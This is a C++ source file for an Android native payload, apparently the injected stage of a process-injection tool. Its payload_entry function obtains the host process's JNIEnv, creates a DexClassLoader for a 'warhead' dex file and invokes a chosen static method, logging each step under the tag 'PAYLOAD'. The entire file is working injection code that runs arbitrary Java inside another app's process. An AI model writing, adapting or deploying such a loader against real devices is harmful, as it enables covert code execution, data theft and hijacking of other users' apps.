#include <android_runtime/AndroidRuntime.h>
#include <unistd.h>
#include <sys/types.h>
#include <android/log.h>

#define ENABLE_DEBUG 1
#ifndef LOGF
#if ENABLE_DEBUG
#define LOGF(...) ((void)__android_log_print(ANDROID_LOG_DEBUG, "PAYLOAD", __VA_ARGS__))
#else
#define LOGF(format,args...)
#endif
#endif

const int WARHEAD_ARGC = 0;
const char** WARHEAD_ARGV = NULL;

#ifdef __cplusplus
extern "C" {
#endif

void payload_entry(char *cachePath, char *warheadPath, char *warheadClassName, char *warheadMethodName) {
	LOGF("[+] Payload successfully initialized.");
	LOGF("[+] Pid: %d, calling %s.%s from %s.", getpid(), warheadClassName, warheadMethodName, warheadPath);

	// Gets the JNIEnv pointer, which would allow us to access the JVM of the current process
	JNIEnv* env = android::AndroidRuntime::getJNIEnv();
	LOGF("[+] JNIEnv pointer found at %p", env);

	jclass stringClass, classLoaderClass, dexClassLoaderClass, targetClass;
	jmethodID getSystemClassLoaderMethod, dexClassLoaderContructor, loadClassMethod, targetMethod;
	jobject systemClassLoaderObject, dexClassLoaderObject;
	jstring dexPathString, dexOptDirString, classNameString, tmpString;
	jobjectArray stringArray;

	// Gets the SystemClassLoader of the current JVM by invoking ClassLoader.getSystemClassLoader()
	classLoaderClass = env->FindClass("java/lang/ClassLoader");
	getSystemClassLoaderMethod = env->GetStaticMethodID(classLoaderClass, "getSystemClassLoader", "()Ljava/lang/ClassLoader;");
	systemClassLoaderObject = env->CallStaticObjectMethod(classLoaderClass, getSystemClassLoaderMethod);
	LOGF("[+] SystemClassLoader found at 0x%08x", (uint32_t) systemClassLoaderObject);

	// Creates a new DexClassLoader instance
	dexClassLoaderClass = env->FindClass("dalvik/system/DexClassLoader");
	dexClassLoaderContructor = env->GetMethodID(dexClassLoaderClass, "<init>", "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V");
	dexPathString = env->NewStringUTF(warheadPath);
	dexOptDirString = env->NewStringUTF(cachePath);
	dexClassLoaderObject = env->NewObject(dexClassLoaderClass, dexClassLoaderContructor, dexPathString, dexOptDirString, NULL, systemClassLoaderObject);
	LOGF("[+] DexClassLoader created at 0x%08x", (uint32_t) dexClassLoaderObject);

	// Uses this DexClassLoader to load the target class */
	loadClassMethod = env->GetMethodID(dexClassLoaderClass, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;");
	classNameString = env->NewStringUTF(warheadClassName);
	targetClass = (jclass) env->CallObjectMethod(dexClassLoaderObject, loadClassMethod, classNameString);
	if (!targetClass) {
		LOGF("[-] Failed while loading the target class %s", warheadClassName);
		return;
	} else {
		LOGF("[+] Target class %s located at 0x%08x", warheadClassName, (uint32_t) targetClass);
	}

	// Invokes the static method defined in the target class
	targetMethod = env->GetStaticMethodID(targetClass, warheadMethodName, "([Ljava/lang/String;)V");
	if (!targetMethod) {
		LOGF("[-] Failed while loading the target method %s", warheadMethodName);
		return;
	} else {
		LOGF("[+] Target method %s located at 0x%08x", warheadMethodName, (uint32_t) targetMethod);
	}
	stringClass = env->FindClass("java/lang/String");
	stringArray = env->NewObjectArray(WARHEAD_ARGC, stringClass, NULL);
	LOGF("[+] Preparing method invoking parameters...");
	for (int i = 0; i < WARHEAD_ARGC; i++) {
		tmpString = env->NewStringUTF(WARHEAD_ARGV[i]);
		env->SetObjectArrayElement(stringArray, i, tmpString);
	}
	LOGF("Invoking method %s", warheadMethodName);
	env->CallStaticVoidMethod(targetClass, targetMethod, stringArray);
	LOGF("Method %s invoked.", warheadMethodName);
}

#ifdef __cplusplus
}
#endif
